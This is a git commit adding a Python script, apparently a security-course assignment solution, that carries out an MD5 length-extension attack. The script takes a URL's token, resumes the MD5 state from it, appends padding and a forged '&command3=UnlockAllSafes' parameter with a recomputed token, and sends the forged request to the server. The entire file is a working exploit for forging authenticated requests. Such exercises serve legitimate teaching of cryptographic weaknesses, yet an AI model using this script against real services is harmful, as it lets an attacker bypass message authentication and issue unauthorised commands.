cf29d7a59af59d5b4370ac8e76e5d543ae21fc97
Chengming Zhang <stvzhg@gmail.com>
2017-09-25 20:22:43 -0400

    add init files and problem 1

---
+++ len_ext_attack.py
@@ -0,0 +1,24 @@
+import httplib, urlparse, sys, urllib
+from pymd5 import md5, padding
+url = sys.argv[1]
+
+# Your code to modify url goes here
+c3 = "&command3=UnlockAllSafes"
+
+parsedUrl = urlparse.urlparse(url)
+query = parsedUrl.query
+params =  urlparse.parse_qs(query)
+token = params["token"][0]
+old = query[(len("token=")+len(token)+1):]
+print old
+
+h = md5(state=token.decode("hex"), count=512)
+pad = padding((len(old)+8)*8)
+qpad = urllib.quote(pad)
+h.update(c3)
+query = "token=" + h.hexdigest() + '&' + old + qpad + c3
+print h.hexdigest()
+
+conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
+conn.request("GET", parsedUrl.path + "?" + query)
+print conn.getresponse().read()
